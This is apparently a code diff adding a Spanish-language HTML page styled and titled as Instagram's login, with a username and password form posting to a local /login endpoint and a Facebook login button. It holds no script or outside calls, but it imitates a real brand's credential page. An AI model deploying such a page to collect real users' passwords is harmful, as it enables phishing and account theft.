@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión - Instagram</title>
+    <link rel="stylesheet" href="styles.css"> <!-- Enlace al archivo CSS -->
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1rem;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            padding: 2rem;
+            width: 350px;
+            text-align: center;
+        }
+        .login-container h1 {
+            font-size: 2rem;
+            margin-bottom: 1rem;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 0.75rem;
+            margin-bottom: 1rem;
+            border: 1px solid #dbdbdb;
+            border-radius: 0.5rem;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 0.75rem;
+            border: none;
+            border-radius: 0.5rem;
+            background-color: #0095f6;
+            color: #ffffff;
+            font-size: 1rem;
+            cursor: pointer;
+            margin-bottom: 1rem;
+        }
+        .login-container button:hover {
+            background-color: #007bb5;
+        }
+        .login-container a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+        .login-container a:hover {
+            text-decoration: underline;
+        }
+        .login-container .divider {
+            margin: 1rem 0;
+            border-top: 1px solid #dbdbdb;
+        }
+        .login-container .social-login {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 1rem;
+        }
+        .login-container .social-login button {
+            background-color: #385185;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Iniciar sesión</h1>
+        <form action="/login" method="post">
+            <input type="text" name="username" placeholder="Teléfono, usuario o correo electrónico" required>
+            <input type="password" name="password" placeholder="Contraseña" required>
+            <button type="submit">Iniciar sesión</button>
+        </form>
+        <div class="divider"></div>
+        <div class="social-login">
+            <button type="button">Iniciar sesión con Facebook</button>
+        </div>
+        <p>¿No tienes una cuenta? <a href="/register">Regístrate</a></p>
+    </div>
+</body>
+</html>
